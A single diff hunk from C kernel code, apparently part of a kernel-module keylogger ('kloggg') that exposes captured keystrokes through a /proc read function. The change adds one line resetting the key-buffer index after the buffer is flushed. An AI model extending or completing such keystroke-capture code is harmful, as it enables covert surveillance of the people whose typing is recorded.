@@ -103,6 +103,7 @@ static ssize_t kloggg_proc_file_read(struct file *file, char __user *ubuf, size_
   kfree(kbuf);
   *ppos = len;
   flush_keybuf_history();
+  cur_keybuf_idx = 0;
   return len;
 }
 
